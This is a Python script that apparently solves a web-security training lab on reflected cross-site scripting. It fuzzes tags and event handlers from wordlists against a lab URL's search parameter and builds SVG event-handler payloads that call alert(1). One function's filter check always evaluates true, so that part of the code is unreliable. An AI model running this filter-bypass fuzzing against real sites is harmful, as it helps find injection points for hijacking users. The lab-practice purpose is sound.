#!/usr/bin/python3

# Reflected XSS into HTML context with most tags and attributes blocked

import requests
import urllib.parse

def connect(url, injection):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("payload.txt", "r"):
        encPayload = urllib.parse.quote(i)
        testUrl = target + encPayload
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        if "Tag is not allowed" or "Attribute is not allowed" or "Not solved" in r.text:
            print(f'Testing for {i}', end="")
            print(r.text)
        else:
            print(f'[INFO] Found XSS Payload: {i}')
            break

def allowedTag(url, injection):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("tag.txt", "r"):
        testUrl = target + "<" + i.rstrip('\n') + ">"
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        if "Tag is not allowed" in r.text:
            pass
        else:
            print(f'[INFO] Allowed tag: {i}', end="")
            #break
    return i

def allowedEvent(url, injection, tag):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    #for i in open("event.txt", "r"):
    for i in open("tag.txt", "r"):
        #testUrl = target + "<" + tag + "%20" + i + "=1>"
        testUrl = target + "<" + tag + "><" + i.rstrip('\n') + ">"
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        
        if "Tag is not allowed" in r.text:
            pass
        elif "Event is not allowed" in r.text:
            pass
        else:
            print(f'[INFO] Allowed event: {i}', end="")
    return i

def customIterate(url, injection):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("event.txt", "r"):
        testUrl = target + "<svg id=x tabindex=1 " + i.rstrip('\n') + "=alert(1)></svg>"
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        
        if "Tag is not allowed" in r.text:
            pass
        elif "Event is not allowed" in r.text:
            pass
        else:
            print(f'[INFO] Allowed event: {i}', end="")
    return i


if __name__ == '__main__':
    url = "https://ac021f211ef5ea0cc054522500c500dd.web-security-academy.net/"
    injection = "?search="
    
    #tag = allowedTag(url, injection)
    #event = allowedEvent(url, injection, tag)
    customIterate(url, injection)


    #print(urllib.parse.quote('"><' + tag + " " + event + "=print()>"))
    #connect(url, injection)




